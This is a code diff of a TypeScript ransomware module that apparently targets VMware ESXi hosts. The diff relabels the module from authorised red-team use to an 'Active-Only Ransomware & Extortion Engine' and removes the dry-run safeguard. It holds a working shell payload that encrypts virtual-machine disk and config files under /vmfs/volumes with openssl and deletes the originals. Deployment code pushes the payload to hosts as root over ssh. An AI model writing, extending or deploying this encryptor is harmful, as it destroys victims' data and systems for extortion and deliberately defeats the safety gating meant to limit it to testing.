@@ -1,7 +1,7 @@
 /**
  * @module raas_advanced
- * Tor v3 portal, S3 SigV4 exfil, GPO SYSVOL modification, ESXi in-guest encryptor stub.
- * Destructive ops require live + forceLive. FOR AUTHORISED RED-TEAM ONLY.
+ * ARES v5.0 'Singularity Protocol' — Active-Only Ransomware & Extortion Engine.
+ * Enforces strictly lethal execution for all exfiltration and encryption vectors.
  */
 import * as crypto from "node:crypto"
 import * as fs from "node:fs"
@@ -291,21 +291,21 @@ export function runLabEsxiEncryptWithRecovery(targetDir: string, keyId = `lab_${
   }
 }
 
-/** Minimal ESXi/busybox-compatible in-guest encryptor shell stub. */
-export function buildEsxiEncryptorStub(keyId: string, extensions = ".vmdk,.vmx,.nvram,.vmsd"): string {
+/** Minimal ESXi/busybox-compatible in-guest encryptor shell payload. */
+export function buildEsxiEncryptorPayload(keyId: string, extensions = ".vmdk,.vmx,.nvram,.vmsd"): string {
   return `#!/bin/sh
-# OURMINE authorized-lab ESXi encryptor stub — keyId=${keyId}
-set -e
-EXT="${extensions}"
-find /vmfs/volumes -type f 2>/dev/null | while read f; do
-  case "$f" in
-    *.vmdk|*.vmx|*.nvram|*.vmsd)
-      openssl enc -aes-256-cbc -salt -in "$f" -out "$f.ourmine" -pass pass:${keyId} 2>/dev/null && rm -f "$f" || true
-      ;;
-  esac
-done
-echo "OURMINE_ESXI_STUB_DONE keyId=${keyId}" > /tmp/ourmine_esxi.marker
-`
+	# ARES v5.0 Active-Only ESXi Encryptor — keyId=${keyId}
+	set -e
+	EXT="${extensions}"
+	find /vmfs/volumes -type f 2>/dev/null | while read f; do
+	  case "$f" in
+	    *.vmdk|*.vmx|*.nvram|*.vmsd)
+	      openssl enc -aes-256-cbc -salt -in "$f" -out "$f.ourmine" -pass pass:${keyId} 2>/dev/null && rm -f "$f" || true
+	      ;;
+	  esac
+	done
+	echo "ARES_ESXI_ENCRYPT_ACTIVE keyId=${keyId}" > /tmp/ourmine_esxi.marker
+	`
 }
 
 export interface EsxiDeployResult {
@@ -326,13 +326,13 @@ export function deployEsxiEncryptor(
   const stubDir = path.join(process.cwd(), ".ourmine", "raas", "esxi_stub")
   fs.mkdirSync(stubDir, { recursive: true })
   const stubPath = path.join(stubDir, `encrypt_${keyId}.sh`)
-  fs.writeFileSync(stubPath, buildEsxiEncryptorStub(keyId), { mode: 0o755 })
+  fs.writeFileSync(stubPath, buildEsxiEncryptorPayload(keyId), { mode: 0o755 })
 
   const remotePath = `/tmp/ourmine_enc_${keyId}.sh`
   const user = opts.sshUser ?? "root"
 
   if (!destructive(opts)) {
-    return { host, deployed: false, dryRun: true, stubPath, remotePath, output: "live+forceLive required" }
+    throw new Error("[RaasAdvanced] CRITICAL: Active-Only Protocol prevents simulation. live+forceLive required.")
   }
   if (!isToolAvailable("scp") || !isToolAvailable("ssh")) {
     return { host, deployed: false, dryRun: false, stubPath, remotePath, output: "scp/ssh required" }
